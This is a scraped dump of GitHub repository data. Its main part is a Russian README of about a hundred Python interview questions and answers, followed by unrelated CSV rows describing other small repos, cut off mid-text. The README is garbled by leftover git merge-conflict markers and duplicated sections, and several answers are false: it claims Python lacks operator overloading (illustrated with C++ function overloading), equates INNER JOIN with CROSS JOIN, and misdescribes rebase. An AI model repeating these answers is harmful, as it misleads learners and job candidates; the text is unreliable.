SQL JOIN 95. SQL оператор HAVING 96. Метаклассы в Python 97. Множественное наследование 98. Компоненты django  Еще 300+ вопросов для подготовки к собеседованию 150 вопросов для собеседования на вакансию Python. Часть 1 (без опыта работы) 150 вопросов для собеседования на вакансию Python. Часть 2 (с опытом работы) 50+ ответов на вопросовы с собеседований по Python 80 практических вопросов по Python для собеседования Разные задачи на Python и решение к ним  1. Виды типизации  Статическая - типизация, при которой переменная связывается с типом в момент объявления, и тип не может быть изменён позже, динамическая - типизация, при которой тип переменной задается в момент присваивания значения, а не в момент объявления, и т.о. может быть изменен позже.  пример статической типизации (С++): int x = 5; x = ""abc"";  // здесь C++ компилятор будет ругаться  или, что то же самое: int x; x = 5; x = ""abc""; // здесь C++ компилятор будет ругаться  пример динамической типизации (Python): x = 5 x = ""a""  # здесь интерпретатор не ругается, так как типизация динамическая   Строгая - отсутствие автоматических кастов в другой тип (неявных преборазований). Нестрогая - наличие таковых.  пример строгой типизации (Python): a = [5, 6] print("","".join(a))  # здесь интерпретатор ругается, так как join() ожидает список строк на входе  пример нестрогой типизации (Javascript): let a = ""hello""; let b = 100; let c = a + b; console.log(c);  // ""hello100""   Явная - указываем типы везде руками. Неявная - компилятор/интерпретатор занимается этим сам.  пример явной типизации (C++): int x = 5; y = 6;  // здесь компилятор будет ругаться  пример неявной типизации (Python): a = 1  Важно: наиболее рационально и оптимально память используется в случае строгой статической типизации. <<<<<<< HEAD к оглавлению ⬆️ 2. Типизация python Динамическая, строгая, неявная. к оглавлению ⬆️ 3. Что такое переменная Переменная Python — это идентификатор для ссылки на объект в памяти программы. На один и тот же объект в памяти могут указывать (ссылаться) несколько переменных. Как только на область памяти перестают ссылаться переменные - данная область очищается сборщиком мусора, и т.о. память освобождается за счет подсчитывания ссылок на объекты в памяти. к оглавлению ⬆️ к оглавлению ⬆️ 2. Типизация python Динамическая, строгая, неявная. к оглавлению ⬆️ 3. Что такое переменная Переменная Python — это идентификатор для ссылки на объект в памяти программы. На один и тот же объект в памяти могут указывать (ссылаться) несколько переменных. Как только на область памяти перестают ссылаться переменные - данная область очищается сборщиком мусора, и т.о. память освобождается за счет подсчитывания ссылок на объекты в памяти. к оглавлению ⬆️        origin/main        4. Числа в python  int - целые числа. float - вещественные или действительные числа(числа с плавающей точкой). complex - комплексные числа. decimal - десятичные дроби.  <<<<<<< HEAD к оглавлению ⬆️ к оглавлению ⬆️        origin/main        5. Строки в python Cтрока – это упорядоченная последовательность символов, которая предназначена для хранения информации в виде простого текста. В Python3 строка по умолчнанию имеет кодировку Unicode, что избавляет от проблем работы и отображения символов кирилицы и прочих экзотических кодировок. Строка это неизменяемый тип данных, т.е. если нужно добавить символов в существующую строку, придется создать новую строку, с новым адресом в памяти: a = ""hello"" id(a) # 2044344987401 a = ""hello world"" id(a) # 2044334957804  к оглавлению ⬆️ 6. Списки (lists) и кортежи (tuples) в python Списки Python схожи с массивами в других языках. Кортеж похож на список, но вы создаете его с круглыми скобками, вместо квадратных. Вы также можете использовать встроенный инструмент для создания кортежей. Разница между списками и кортежами в том, что кортеж неизменяем, в то время как список изменяем. Т.е. в список можно добавить элемент и его адрес в памяти не изменится, а если нужно добавить элемент в кортеж, то нужно создать новый кортеж, и у него уже будет новый адрес в памяти: # список a = [1,2] id(a) # 2044364987904 a.append(3) id(a) # 2044364987904  # кортеж a = (1,2) id(a) # 2044370285184 a = (1,2,3) id(a) # 2044369999872  Важно: кортеж занимает меньше места в памяти чем список, и поэтому всегда, когда массив объектов заведомо неизменяем, рекомендуется использовать кортежи, вместо списков. к оглавлению ⬆️ 7. Cловарь в python Словари в Python - коллекции произвольных объектов с доступом по ключу. Начиная с Python3.6 словарь dict() упорядочен, т.е. при переборе имеющегося словаря, элементы возвращаются в том порядке, в котором они были добавлены в словарь при его наполнении. До Python3.6 приходилось использовать объект OrderedDict(), чтобы иметь упорядоченную коллекцию, с доступам к элементам по ключам. Словарь это изменяемый тип данных. к оглавлению ⬆️ 8. Какие типы данных относятся к структурам данных  Массивы Стеки Кучи Очереди Связанные списки Графы Деревья Хэш таблицы Map  к оглавлению ⬆️ 9. Что такое Git Распределённая система управления версиями. Разработан Линусом Торвальдсом, для удобной разработки ядра Linux. к оглавлению ⬆️ 10. Как создать гит репозиторий локально git init  к оглавлению ⬆️ 11. Что такое git push Отправка всех неотправленных локальных коммитов на удалённый сервер репозитория. к оглавлению ⬆️ 12. Что делает git commit Фиксирует изменения локальных файлов в таймлайне репозитория. Другими словами делает ""моментальный снимок"" репозитория в данный момент времени, который и является версией. к оглавлению ⬆️ 13. Git merge и rebase git merge - принимает содержимое ветки источника и объединяет их с целевой веткой. В этом процессе изменяется только целевая ветка. История исходных веток остается неизменной. git rebase — еще один способ перенести изменения из одной ветки в другую. Rebase сжимает все изменения в один «патч». Затем он интегрирует патч в целевую ветку. В отличие от слияния, перемещение перезаписывает историю, потому что она передает завершенную работу из одной ветки в другую. В процессе устраняется нежелательная история. к оглавлению ⬆️ 14. Что такое виртуальное окружение Виртуальное окружение (virtualenv) — это инструмент для создания отдельного пространства для проекта с его зависимостями и библиотеками в директории проекта. к оглавлению ⬆️ 15. Как установить виртуальное окружение pip install virtualenv python -m venv namevenv  к оглавлению ⬆️ 16. Виды форматирования строк  Форматирование f-строками. Форматирование методом str.format(). Форматирование оператором '%'.  к оглавлению ⬆️ 17. Cрезы или слайсы в python item[START:STOP:STEP]  Функция Python slice() возвращает нарезанный объект из набора индексов ввода, указанного пользователем в соответствии с переданными ему аргументами. Объект должен быть iterable. к оглавлению ⬆️ 18. Что такое итерация Переход к следующему объекту в коллекции, например список, кортеж и т.д. Сам по себе объект коллекции должен быть iterable. к оглавлению ⬆️ 19. Какие циклы есть в python while и for. к оглавлению ⬆️ 20. Чем отличается while от for For используется только тогда, когда необходимо совершить перебор элементов заранее известное число раз. Цикл while также используется для повторения частей кода, но вместо зацикливания на n количество раз, он выполняет работу до тех пор, пока не достигнет определенного условия. Выйти из цикла в любой момент можно используя ключевое слово break, а перейти на следующую итерацию цикла можно используя слово continue. к оглавлению ⬆️ 21. Каким образом реализовано ветвление в python if-elif-else к оглавлению ⬆️ 22. Как запросить у пользователя ввод Для получения информации с клавиатуры в Python есть функция input(). к оглавлению ⬆️ 23. Преобразование типов  Преобразование типов - это преобразование объекта из одного типа данных в другой тип данных. Неявное преобразование типов автоматически выполняется интерпретатором Python. Python позволяет избежать потери данных в неявном преобразовании типов. Явное преобразование типов также называется приведением типов, типы данных объекта преобразуются с использованием предопределенной функции. При приведении типов может произойти потеря данных, поскольку мы приводим объект к определенному типу данных.  к оглавлению ⬆️ 24. Что такое аннотация типов В простейшем случае аннотация содержит непосредственно ожидаемый тип. Аннотации для переменных пишут через двоеточие после идентификатора. После этого может идти инициализация значения. Например price: int = 5 Параметры функции аннотируются так же как переменные, а возвращаемое значение указывается после стрелки -> и до завершающего двоеточия. Например def indent_right(s: str, width: int) -> str:. Важно: аннотация типов не есть то же самое, что статическая типизация. к оглавлению ⬆️ 25. Строка это последовательность или нет Да. к оглавлению ⬆️ 26. Что такое PEP PEP - Python Enhancement Proposals - база всех предложений как улучшить Python и что изменить. Например PEP8 - это общепринятое руководство по написанию кода на Python. к оглавлению ⬆️ 27. Что такое фунция range Функция range() возвращает объект с интерфейсом итератора, выдающий элементы из диапазона, определяемого аргументами функции range(старт, стоп, шаг), при этом не храня все элементы в памяти. к оглавлению ⬆️ 28. Что делает enumerate Если начальное значение счётчика enumerate() не передаётся — оно, по умолчанию, устанавливается в 0. Функция создаёт объект, генерирующий кортежи, состоящие из индекса элемента и самого этого элемента. к оглавлению ⬆️ 29. Какие методы списков  list.append(x) Добавляет элемент в конец списка list.extend(L) Расширяет список list, добавляя в конец все элементы списка L list.insert(i, x)	Вставляет на i-ый элемент значение x list.remove(x) Удаляет первый элемент в списке, имеющий значение x. ValueError, если такого элемента не существует list.pop([i])	Удаляет i-ый элемент и возвращает его. Если индекс не указан, удаляется последний элемент list.index(x, [start [, end]])	Возвращает положение первого элемента со значением x (при этом поиск ведется от start до end) list.count(x)	Возвращает количество элементов со значением x list.sort([key=функция])	Сортирует список на основе функции list.reverse() Разворачивает список list.copy()	Поверхностная копия списка list.clear() Очищает список  к оглавлению ⬆️ 30. Что в python не является объектом В python всё является объектом, кроме ключевых слов: in, is, if, while, и т.д. к оглавлению ⬆️ 31. Название переменных Имя переменной может состоять только из цифр, букв и знаков подчеркивания. Имя переменной может начинаться только с буквы или с нижнего подчеркивания. Никаких чисел в начале имени переменной быть не должно.  Имя переменной не может содержать ключевые слова (зарезервированные) языка Python. Принято разделять слова нижним подчеркиванием (snake case). к оглавлению ⬆️ 32. Что такое литералы Литерал в Python – это простейший способ создания объектов. Если в тексте программы встречается литерал, то для этого литерала создается отдельный объект некоторого типа, соответствующего содержанию литерала: ""Hello""  # строковый литерал 1123     # целочисленный литерал [1,2]    # списковый литерал  к оглавлению ⬆️ 33. Можно ли число сделать строкой Чтобы конвертировать число в строку, используйте встроенную функцию str(). к оглавлению ⬆️ 34. Что делает метод split() Разбивает строку на части, используя специальный разделитель, и возвращает эти части в виде списка str.split([разделитель [, maxsplit]]). к оглавлению ⬆️ 35. Что делает метод join() Метод ""str"".join([""Hello"", ""world""]) возвращает строку, которая является конкатенацией (объединением) всех элементов строк итерируемого объекта iterable. В итоговой строке элементы объединяются между собой при помощи строки-разделителя str. Элементы итерируемого объекта должны быть строками (ну или как минимум иметь реализованный магический метод __str__()). к оглавлению ⬆️ 36. Как импортировать модуль Используя ключевое слово “import”, например import random Использование псевдонимов — as. Некоторые модули имеют длинное и неудобное название. Для удобства и сокращения количества кода программист может заменить его на своё. Для импорта конкретных объектов используют конструкцию from ... import .... к оглавлению ⬆️ 37. Как импортировать все содержимое модуля from module_name import * import module_name  к оглавлению ⬆️ 38. Сколько пар ключ значение может быть в словаре Ограничено объемом оперативной памяти. к оглавлению ⬆️ 39. Какой тип данных может быть значением в словаре Ключом может являться в принципе любой неизменяемый тип данных. к оглавлению ⬆️ 40. Как узнать id элемента Функция id() возвращает уникальный идентификатор для указанного объекта. По сути этот идентификатор однозначно опредедяет адрес объекта в памяти интерпретатора. к оглавлению ⬆️ 41. Как узнать версию python В консоли прописать python --version к оглавлению ⬆️ 42. Отличия второго python от 3 Огромное количество отличий. Самые значимые/ключевые:  строки в Python3 по умолчанию в кодировке Unicode в Python3 теперь range вместо xrange в словарях в Python3 теперь нет некоторых методов в Python3 появилась возможность распаковывать переменных через оператор * -....  Подробнее здесь. к оглавлению ⬆️ 43. Как прервать выполнение цикла Оператор break досрочно прерывает цикл. к оглавлению ⬆️ 44. Что означает continue Оператор continue начинает следующий проход цикла, минуя оставшееся тело цикла (for или while). к оглавлению ⬆️ 45. Что будет если сравнить 5 и 5.0 True к оглавлению ⬆️ 46. Что быстрее python или c++ C++ к оглавлению ⬆️ 47. Что такое байт код Python - интерпретируемый язык программирования. Он не конвертирует свой код в машинный, который понимает железо (в отличие от С и С++). Процесс такой вот конвертации называется компилляцией. Вместо этого, Python-интерпретатор, а точнее говоря его стандартная реализация CPython, переводит код программы в байт-код, который запускается на виртуальной машине Python (PVM). Есть реализация интерпретатора Python, которая работает через JIT (just in time) компилляцию - Pypy. к оглавлению ⬆️ 48. Как избежать конфликтов при импорте файлов  Называть свои модули так, чтобы имена не совпадали с именами сторонних/стандартных библиотек, которые также используются в коде Ипользовать as при импорте, чтобы заменять названия импортируемых модулей  к оглавлению ⬆️ 49. Что означает %s %d %s Строка %d Десятичное число. к оглавлению ⬆️ 50. Что такое класс Класс — тип, описывающий устройство объектов. Другими словами, это описание сущности, у которой есть определенный набор свойств и методов. к оглавлению ⬆️ 51. Что такое наследование Возможность одному классу выступать в качестве наследника для другого, перенимая тем самым его свойства и методы. Ключевой момент наследования - это то, что класс наследник может не только использовать методы и свойства родительского класса, но и переопределить их, а также добавить новые свойства и методы. к оглавлению ⬆️ 52. Что такое инкапсуляция Ограничение доступа к составляющим объект компонентам (методам и свойствам). Инкапсуляция делает некоторые из компонент доступными только внутри класса. к оглавлению ⬆️ 53. Что такое полиморфизм Разное поведение одного и того же метода в разных классах. к оглавлению ⬆️ 54. Сколько может быть родителей и наследников у класса Неограниченное количество. к оглавлению ⬆️ 55. Что такое перегрузка операторов Один из способов реализации полиморфизма, заключающийся в возможности одновременного существования в одной области видимости нескольких различных вариантов применения оператора, имеющих одно и то же имя, но различающихся типами параметров, к которым они применяются. Перегрузка операторов не поддерживается в Python. Пример из C++, где поддерживается перегрузка операторов: float getArea(float a, float b) // функция, вычисляющая площадь прямоугольника с длиной a и высотой b {   return a * b; }  float getArea(float r) // функция, вычисляющая площадь круга с радиусом r {   return pi * r * r; }  float S1 = getArea(5.0, 6.0); // 30 float S3 = getArea(5.0); // 78.5  к оглавлению ⬆️ 56. Магические методы Это специальные методы в python, обрамленные двумя нижними подчеркиваниями  Инициализация объекта: __init__ Строковые представления: __repr__ , __str__ Итерация: __iter__ , __next__ и другие  к оглавлению ⬆️ 57. Модификаторы доступа Есть три типа модификаторов доступов в Python ООП:  публичный public приватный __private защищенный _protected  Важно: в Python нету жесткой инкапсуляции, т.е. даже к приватному методу можно получить доступ снаружи класса. Инкапсуляция в Python это больше договорянность между разработчиками, чем жесткое сокрытие, как например в C++ или Java. к оглавлению ⬆️ 58. Генераторы Это функция, которая будучи вызванной в функции next() возвращает следующий объект согласно алгоритму ее работы. Вместо ключевого слова return в генераторе используется yield. Главное отличие yield от return это то, что yield, после возврата объекта, сохраняет стек генератора, так что при следующем вызове функции next() от генератора, исполнение кода генератора продолжится с того момента, где yield вернул объект в прошлый раз. к оглавлению ⬆️ 59. Как пишутся комментарии в python С помощью символа #. Так же есть такое понятие как docstring задать его можно с помощью тройных кавычек. к оглавлению ⬆️ 60. Как можно обратить (reverse) порядок элементов в списке С помощью среза [::-1] или встроенной функции reversed(). к оглавлению ⬆️ 61. Если мы не поставим двоеточие в конце строки для цикла ""do-while"", он все равно сработает? В python такой цикл не реализован. Это вопрос из тех, которые с подвохом, когда упоминают элементы других языков. к оглавлению ⬆️ 62. Как убрать из списка дубликат элемента Для этого можно конвертировать список во множество set(). к оглавлению ⬆️ 63. Расскажите про арифметические операторы //, %, и **  Оператор // выполняет целочисленное деление и возвращает целую часть числа, полученного в результате операции:  7 // 2  = 3   Оператор ** возводит в степень:  2**10 = 1024   Оператор % возвращает результат деления по модулю, то есть остаток после деления:  13 % 7 = 6  к оглавлению ⬆️ 64. Как посчитать длину строки (string) Для этого вызываем функцию len(). к оглавлению ⬆️ 65. Расскажите про генераторы списков (list comprehension) Генераторы позволяют создавать списки с помощью одной строки кода >>> [i for i in range(1, 11, 2)] [1, 3, 5, 7, 9]   к оглавлению ⬆️ 66. Что такое HTTP HyperText Transfer Protocol — «протокол передачи гипертекста». По умолчанию использует для работы TCP порт 80. к оглавлению ⬆️ 67. Что такое json, xml JSON - текстовый формат обмена данными, основанный на JavaScript - JavaScript Object Notation. XML - в переводе с англ eXtensible Markup Language — расширяемый язык разметки. Используется для хранения и передачи данных. к оглавлению ⬆️ 68. Чем отличается HTML и XML Разница: HTML - это язык разметки, который используется для разработки веб-страниц. Его основная цель - отображение данных с акцентом на их внешний вид. XML - это язык разметки, основной целью которого является транспортировка и хранение данных. к оглавлению ⬆️ 69. Что такое CRUD Терамин обозначающий четыре базовые функции: создание (create), чтение (read), редактирование (update) и удаление (delete). Как правило термин ""CRUD"" употребляется в контексте работы с хранилищем данных. к оглавлению ⬆️ 70. Какой паттерн программирования реализует Django Фреймворк Django реализует архитектурный паттерн Model-View-Template. В DRF Request-Process-Response. к оглавлению ⬆️ 71. На каком этапе в приложении Django происходит запрос к базе данных QuerySet может быть создан, отфильтрован, ограничен и использован фактически без выполнения запросов к базе данных. База данных не будет затронута, пока вы не спровоцируете выполнение QuerySet. к оглавлению ⬆️ 72. Какой результат будет Post.objects.all() и какого типа вернет Объект класса QuerySet. к оглавлению ⬆️ 73. Что такое SQL SQL или Structured Query Language (язык структурированных запросов) — язык программирования, предназначенный для управления данными в СУБД. к оглавлению ⬆️ 74. Каким запросом я могу достать все данные из таблицы SELECT * FROM nametable  к оглавлению ⬆️ 75. Что такое многие-ко-многим Связь многие ко многим описывает ситуацию, когда объект первой модели может одновременно ассоциироваться с несколькими объектами второй модели. И наоборот, один объект второй модели может также одновременно быть ассоциирован с несколькими объектами первой модели. Например, один студент может посещать несколько курсов, а один курс могут посещать несколько студентов. к оглавлению ⬆️ 76. Как реализуется М2М в SQL Связь многие ко многим подразумевает, что записи в одной таблице могут иметь множество ссылок на другую таблицу и наоборот. Когда есть такой тип связи нужно создавать дополнительную таблицу, которая сведет связь многие ко многим до связи один ко многим. к оглавлению ⬆️ 77. Что такое JOIN и какой он может быть  INNER JOIN (CROSS JOIN) - внутреннее (перекрёстное) объединение. LEFT JOIN - левостороннее внешнее объединение. RIGHT JOIN - правостороннее внешнее объединение. FULL OUTER JOIN (FULL JOIN) - полное объединение  к оглавлению ⬆️ 78. Что такое View Views отвечают за обработку и передачу данных и могут реализовывать одну или несколько функций. В Django используются два вида представлений:  Представления-функции (view functions), Представления-классы (class based views).  к оглавлению ⬆️ 79. Что такое миксины Mixin представляет собой набор свойств и методов, которые могут быть использованы в различных классах, которые не приходят из базового класса. к оглавлению ⬆️ 80. Звёздный синтаксис    и ** для передачи аргументов в функцию;     и **   для сбора переданных в функцию аргументов;   ** для принятия только именованных аргументов;   при распаковке кортежей;     для распаковки итерируемых объектов в список/кортеж;   ** для распаковки словарей в другие словари.  к оглавлению ⬆️ 81. Два способа создания класса Класс type() с тремя аргументами вернет объект нового типа. Это по сути динамическая форма инструкции class, ее еще называют метакласс. type(class_name, super_classes, attributes_dict) к оглавлению ⬆️ 82. Чем файл .pyc отличается от .py .pyc содержат скомпилированный байт-код исходных файлов Python к оглавлению ⬆️ 83. Что делает python объектно-ориентированым Он следует парадигме объектно-ориентированного программирования, которая построена вокруг классов (classes) и их экземпляров (instances). Это позволяет реализовать следующие функции:  сокрытие внутренней структуры данных абстракция наследование полиморфизм (способность выбирать правильный метод в зависимости от типа данных) ограничение доступа к данным.  к оглавлению ⬆️ 84. Как производится отладка программы на Python Использовать IDE с поддержкой дебага либо использовать модуль pdb import pdb; pdb.set_trace()  к оглавлению ⬆️ 85. Что такое GIL Глобальная блокировка интерпретатора CPython. Это механизм, который не позволяет нескольким потокам выполнить один и тот же байткод. Другими словами, благодаря GIL, в каждый момент времени в контексте одного процесса Python исполняется только один поток (Thread), все остальные ждут своей очереди на исполнение. Именно поэтому многопоточность не ускоряет обработку данных в разных потоках, так как по факту все обрабатывается последовательно. к оглавлению ⬆️ 86. Статусы ответов HTTP Коды сгруппированы в 5 классов:  Информационные 100 - 199 Успешные 200 - 299 Перенаправления 300 - 399 Клиентские ошибки 400 - 499 Серверные ошибки 500 – 599  Подробнее https://developer.mozilla.org/ru/docs/Web/HTTP/Status к оглавлению ⬆️ 87. Что такое Django Middleware Django Middleware (middleware в переводе ""промежуточный слой"") – это промежуточный слой между запросом (request) и ответом (response). В Django по умолчанию содержатся наиболее важные и нужные middleware. Например, AuthenticationMiddleware, ассоциирует пользователей с запросами с помощью сессий. Можно написать свой middleware: например хорошим вариантом может быть middleware для отлавливания и логгирования всех тех исключений которые не были отловлены на более низких уровнях. к оглавлению ⬆️ 88. Как вставить объект чтобы он оказался под определенным индексом? Сначала создадим список: >>> a=[1, 2, 4]  Затем используем метод insert(). В нем первым аргументом будет индекс, под которым вставляется объект, а вторым — значение объекта: >>> a.insert(2,3) >>> a [1, 2, 3, 4]  к оглавлению ⬆️ 89. Что нужно сделать, чтобы функция возвращала значение? Использовать оператор return или yield к оглавлению ⬆️ 90. Что если в функции не будет return, будет ли она что-то возвращать? Функция может и не заканчиваться инструкцией return, при этом функция вернет значение None <<<<<<< HEAD к оглавлению ⬆️ к оглавлению ⬆️        origin/main        91. Напишите в одну строку как можно получить самую позднюю по коду букву в строке Строковый метод  max() будет сравнивать значение ASCII каждого символа в строке и  возвращает максимальный алфавитный символ. >>> str = ""Wow! This is string!"" >>> max(str) 'w'  <<<<<<< HEAD к оглавлению ⬆️ к оглавлению ⬆️        origin/main        92. Как конвертировать список в строку? Мы могли бы использовать метод str.join() для преобразования списка, который имеет элементы типа данных str в строку. Например, >>> a = [""a"", ""b"", ""c""] >>> """".join(a) 'abc'  Метод join объединяет любое количество строк, строка, метод которой вызывается, вставляется между каждой заданной строкой. Как показано в примере, между элементами списка вставляется строка """", пустая строка. Метод join требует в качестве заданных параметров тип данных str. Поэтому, если вы попытаетесь присоединиться к списку типов int, вы получите TypeError. Перед соединением тип int должен быть преобразован в тип str. >>> a = [1,2,3] >>> """".join([str(_) for _ in a]) ""123""  или при помощи функции map: >>> a = [1,2,3] >>> """".join(map(str, a)) '123'  <<<<<<< HEAD к оглавлению ⬆️ к оглавлению ⬆️        origin/main        93. Принципы SOLID S – Single Responsibility (Принцип единственной ответственности) Каждый класс должен отвечать только за одну операцию. O — Open-Closed (Принцип открытости-закрытости) Классы должны  быть  открыты для расширения, но закрыты для модификации. L — Liskov Substitution (Принцип подстановки Барбары Лисков) Если П является подтипом Т, то любые объекты типа Т, присутствующие в программе, могут заменяться объектами типа П без негативных последствий для функциональности программы. I — Interface Segregation (Принцип разделения интерфейсов) Не следует ставить клиент в зависимость от методов, которые он не использует. D — Dependency Inversion (Принцип инверсии зависимостей) Модули верхнего уровня не должны зависеть от модулей нижнего уровня. И те, и другие должны зависеть от абстракций. Абстракции не должны зависеть от деталей. Детали должны зависеть от абстракций. <<<<<<< HEAD к оглавлению ⬆️ к оглавлению ⬆️        origin/main        94. SQL JOIN INNER	JOIN		Возвращает записи которые имеют соответствие в обеих таблицах  OUTER	LEFT JOIN	Возвращает все записи из левой таблицы + записи которые имеют соответствие из правой  OUTER	RIGHT JOIN	Возвращает все записи из правой таблицы + записи которые имеют соответствие из левой  OUTER	FULL JOIN	Возвращает все записи из обеих таблиц  <<<<<<< HEAD к оглавлению ⬆️ к оглавлению ⬆️        origin/main        95. SQL оператор HAVING SQL оператор HAVING используется в сочетании с оператором GROUP BY, чтобы ограничить группы возвращаемых строк только теми, чьё условие TRUE. 96. Метаклассы в Python Метакласс это «штука», которая создаёт классы. Мы создаём класс для того, чтобы создавать объекты, так? А классы являются объектами. Метакласс это то, что создаёт эти самые объекты. Они являются классами классов, можно представить это себе следующим образом:   MyClass = MetaClass()   MyObject = MyClass()  Мы уже видели, что type позволяет делать что-то в таком духе: MyClass = type('MyClass', (), {}) Это потому что функция type на самом деле является метаклассом. type это метакласс, который Питон внутренне использует для создания всех классов. 97. Множественное наследование class Class1:         # Базовый класс для класса Class2     def f_func1(self):         print ""Метод f_func1() класса Class1""   class Class2(Class1): # Класс Class2 наследует класс Class1     def f_func2(self):         print ""Метод f_func2() класса Class2""   class Class3(Class1): # Класс Class3 наследует класс Class1     def f_func1(self):         print ""Метод f_func1() класса Class3""     def f_func2(self):         print ""Метод f_func2() класса Class3""     def f_func3(self):         print ""Метод f_func3() класса Class3""     def f_func4(self):         print ""Метод f_func4() класса Class3""   class Class4(Class2, Class3): # Множественное наследование     def f_func4(self):         print ""Метод f_func4() класса Class4""   c1 = Class4()             # Создаем экземпляр класса Class4 c1.f_func1()              # Выведет: Метод f_func1() класса Class1 c1.f_func2()              # Выведет: Метод f_func2() класса Class2 c1.f_func3()              # Выведет: Метод f_func3() класса Class3 c1.f_func4()              # Выведет: Метод f_func4() класса Class4  98. Компоненты django  "
417916539;Construindo-API-s-robustas-utilizando-Python;https://github.com/vitorStein/Construindo-API-s-robustas-utilizando-Python;Python;2021-10-16T18:40:48Z;0;0;0;Construindo API's robustas utilizando Python Tutorial Python Brasil 2021 - Construindo API's robustas utilizando Python 
417916841;tutorial-pybr;https://github.com/andressaicimoto/tutorial-pybr;;2021-10-16T18:42:17Z;0;0;0;tutorial-pybr Tutorial Python Brasil 2021 
417916850;tutorial-ptbr;https://github.com/bruno-candia/tutorial-ptbr;Python;2021-10-16T18:42:21Z;0;0;0;tutorial-ptbr Tutorial Python Brasil 2021 
417918366;tutorial-pybr;https://github.com/hugomacielads/tutorial-pybr;;2021-10-16T18:49:09Z;0;0;0;tutorial-pybr Tutorial Python Brasil 2021 
417878040;catwiki_p3;https://github.com/cabalamat/catwiki_p3;SCSS;2021-10-16T16:04:23Z;0;0;0;About CatWiki CatWiki (aka Catwiki) is very simple wiki software that stores its articles as text files. Catwiki was originally written for Python 2.8. This version (catwiki_p3) is Catwiki for Python 3.5 and later. Features  Stores articles as text files, so they are easy to back up and manipulate. Even if the wiki software goes down, you can still get at your notes. Uses an enhanced version of the the Markdown markup language. Allows multiple wikis per installation, each one in its own directory. Allows subdirectories. You can navigate through the directories using the web interface. If the directory includes image files, the web page shows thumbnails of them. You can add Font Awesome icons in your wiki pages.  Technology Used CatWiki is written in Python and uses the Flask lightweight web framework. Screenshots Here are some screenshots of CatWiki in action. An article Here is an article in CatWiki:  The article editor Here is the same article in CatWiki's text editor:  Folder view This shows all the articles, other files, and sub-folders in a folder.  
417927797;pyoctl;https://github.com/OmSaran/pyoctl;Python;2021-10-16T19:31:53Z;0;0;0;pyoctl Do IOCTL in python for custom devices. Reference: [1]: https://stackoverflow.com/questions/14626395/how-to-properly-convert-a-c-ioctl-call-to-a-python-fcntl-ioctl-call [2]: https://web.archive.org/web/20140430084413/http://bugcommunity.com/wiki/index.php/Develop_with_Python#Introduction_to_ioctl_calls_in_python 
417909934;tutorial-pybr;https://github.com/the-bmb/tutorial-pybr;Python;2021-10-16T18:11:13Z;0;0;0;tutorial-pybr Tutorial Python Brasil 2021 
417930792;PontosChaveDoCorpo;https://github.com/AlonsoMendes/PontosChaveDoCorpo;Python;2021-10-16T19:46:10Z;0;0;0;PontosChaveDoCorpo Utilizando Python e OpenCV 
417929668;py;https://github.com/Arjun-Anubis/py;Python;2021-10-16T19:40:39Z;0;0;0;Python This has a few python files:  A plot of a non-polynoial using mplt3d called ninen.py cuz 9n + 7 = x squared  Images  
417920086;congenial-winner;https://github.com/milajon/congenial-winner;;2021-10-16T18:58:11Z;0;0;0;
417938404;Coin-toss_day-4-1;https://github.com/rafi-khan/Coin-toss_day-4-1;Python;2021-10-16T20:17:53Z;0;0;0;
417915825;PyEditor;https://github.com/ArmenG888/PyEditor;Python;2021-10-16T18:37:29Z;1;1;0;PyEditor  work in progress  Text Editor for python  Installation   git clone https://github.com/ArmenG888/PyEditor   Install the libraries  Linux or mac  pip3 install -r requirements.txt   Windows  pip install -r requirments.txt   cd PyEditor  Linux or mac  python3 main.py  Windows  python main.py   Image of the app   
417881191;audio-stenography-flask;https://github.com/karanysingh/audio-stenography-flask;Python;2021-10-16T16:15:54Z;0;0;0;Audio Steganography Audio Steganography is a technique used to transmit hidden information by modifying an audio signal in an imperceptible manner. About the project Its the part of the information security J component Tech Stack  Flask used to create the web-app and configure the end points. Python base language for steganography and other operations.  Hosted at  https://steno-flask.herokuapp.com/  End-points  POST at /decode with form including the file with key/name file to get the message decoded inside the file. POST at /upload with form including the file with key/name file and the message with key/name message to get the encoded file.  Instructions to run locally  use pip install -r requirements.txt to install all the dependencies. use python3 app.py to run the project.  Contributors  Shrimayee Himanshu Karan  
417935414;guidos-gorgeous-lasagna;https://github.com/meganriley/guidos-gorgeous-lasagna;Python;2021-10-16T20:04:29Z;0;0;0;"Guido's Gorgeous Lasagna Welcome to Guido's Gorgeous Lasagna on Exercism's Python Track. If you need help running the tests or submitting your code, check out HELP.md. If you get stuck on the exercise, check out HINTS.md, but try and solve it without using those first :) Introduction Python is a dynamic and strongly typed object-oriented programming language. It employs both duck typing and gradual typing, via type hints. Programming across paradigms is fully supported -- but internally, everything in Python is an object. Python puts a strong emphasis on code readability and (similar to Haskell) uses significant indentation for function, method, and class definitions. The Zen of Python (PEP 20) and What is Pythonic? lay out additional philosophies. Objects are assigned to names via the assignment operator, =. Variables are written in snake_case, and constants usually in SCREAMING_SNAKE_CASE. A name (variable or constant) is not itself typed, and can be attached or re-attached to different objects over its lifetime. For extended naming conventions and advice, see PEP 8. >>> my_first_variable = 1 >>> my_first_variable = ""Last one, I promise"" >>> print(my_first_variable) ... ""Last one, I promise"" Constants are typically defined on a module or global level, and although they can be changed, they are intended to be named only once. Their SCREAMING_SNAKE_CASE is a message to other developers that the assignment should not be altered: # All caps signal that this is intended as a constant. MY_FIRST_CONSTANT = 16  # Re-assignment will be allowed by the compiler & interpreter, # but this is VERY strongly discouraged. # Please don't do: MY_FIRST_CONSTANT = ""Some other value"" The keyword def begins a function definition. It must be followed by the function name and a parenthesized list of zero or more formal parameters. Parameters can be of several different varieties, and can even vary in length. The def line is terminated with a colon. Statements for the body of the function begin on the line following def and must be indented in a block. There is no strict indentation amount (either space OR [tab] characters are acceptable), but indentation must be consistent for all indented statements. Functions explicitly return a value or object via the return keyword. # Function definition on first line. def add_two_numbers(number_one, number_two):   return number_one + number_two  # Returns the sum of the numbers, and is indented by 2 spaces.  >>> add_two_numbers(3, 4) 7 Functions that do not have an explicit return expression will return None. # This function will return None. def add_two_numbers(number_one, number_two):   result = number_one + number_two  >>> print(add_two_numbers(5, 7)) None Inconsistent indentation will raise an error: # The return statement line does not match the first line indent. >>> def add_three_numbers_misformatted(number_one, number_two, number_three): ...     result = number_one + number_two + number_three   # Indented by 4 spaces. ...    return result     #this was only indented by 3 spaces   File ""<stdin>"", line 3     return result                 ^ IndentationError: unindent does not match any outer indentation level Functions are called using their name followed by (). The number of arguments passed in the parentheses must match the number of parameters in the original function definition unless default arguments have been used: >>> def number_to_the_power_of(number_one, number_two):         """"""Raise a number to an arbitrary power.                  :param number_one: int the base number.         :param number_two: int the power to raise the base number to.         :return: int - 